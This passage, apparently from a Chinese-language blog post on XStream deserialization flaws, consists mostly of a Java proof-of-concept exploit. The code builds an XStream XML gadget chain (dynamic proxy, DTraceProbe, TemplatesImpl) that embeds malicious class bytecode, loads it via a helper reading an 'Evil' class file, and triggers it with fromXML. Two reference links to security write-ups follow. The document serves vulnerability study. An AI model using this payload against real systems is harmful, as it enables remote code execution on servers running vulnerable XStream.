                "                            <class>java.lang.Object</class>\n" +
                "                            <name>hashCode</name>\n" +
                "                            <parameter-types/>\n" +
                "                        </method>\n" +
                "                        <sun.tracing.dtrace.DTraceProbe>\n" +
                "                            <proxy class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'>\n" +
                "                                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                                    <default>\n" +
                "                                        <__name>Pwnr</__name>\n" +
                "                                        <__bytecodes>\n" +
                "                                            <byte-array>" +Evilcls+ "</byte-array>\n" +
                "                                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ</byte-array>\n" +
                "                                        </__bytecodes>\n" +
                "                                        <__transletIndex>-1</__transletIndex>\n" +
                "                                        <__indentNumber>0</__indentNumber>\n" +
                "                                    </default>\n" +
                "                                    <boolean>false</boolean>\n" +
                "                                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                            </proxy>\n" +
                "                            <implementing__method>\n" +
                "                                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\n" +
                "                                <name>getOutputProperties</name>\n" +
                "                                <parameter-types/>\n" +
                "                            </implementing__method>\n" +
                "                        </sun.tracing.dtrace.DTraceProbe>\n" +
                "                    </entry>\n" +
                "                </probes>\n" +
                "            </defaultHandler>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</linked-hash-set>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
    public static String readClassStr() throws IOException {
        byte[] code = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code);
    }
}
```



参考：

https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/

https://xz.aliyun.com/t/10360?time__1311=Cqjx2Qi%3D0QMDlxGghF2Ph%3DKGCFC3x